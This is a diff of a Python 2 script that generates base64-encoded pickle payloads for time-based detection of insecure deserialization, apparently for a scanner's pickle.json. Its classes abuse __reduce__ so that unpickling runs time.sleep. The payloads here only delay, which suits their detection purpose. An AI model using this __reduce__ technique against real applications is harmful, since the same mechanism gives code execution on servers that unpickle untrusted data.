@@ -3,24 +3,24 @@ import time
 import base64
 
 
-class DelayUsingSleep(object):
+class DelayUsingSleep1(object):
     def __reduce__(self):
-        return time.sleep, (123456,)
+        return time.sleep, (1,)
 
 
-REPLACE_TOKEN = '__DELAY_HERE__'
+class DelayUsingSleep22(object):
+    def __reduce__(self):
+        return time.sleep, (22,)
 
-dump = cPickle.dumps(DelayUsingSleep())
-dump_with_replace = dump.replace('123456', REPLACE_TOKEN)
-payload = base64.b64encode(dump_with_replace)
 
-print repr(dump_with_replace)
+dump = cPickle.dumps(DelayUsingSleep1())
+payload = base64.b64encode(dump)
 
-print('Save this to pickle.json: %s' % payload)
+print('Save this to pickle.json "1": %s' % payload)
 
-# Just for testing that everything works as expected
-for i in [1, 3, 5, 11]:
-    print('Sleeping for %s seconds' % i)
-    dump_i = dump_with_replace.replace(REPLACE_TOKEN, str(i))
-    cPickle.loads(dump_i)
+dump = cPickle.dumps(DelayUsingSleep22())
+payload = base64.b64encode(dump)
 
+print('Save this to pickle.json "2": %s' % payload)
+
+print('Manually check the offsets of the 1 and 22 strings and save them to pickle.json')
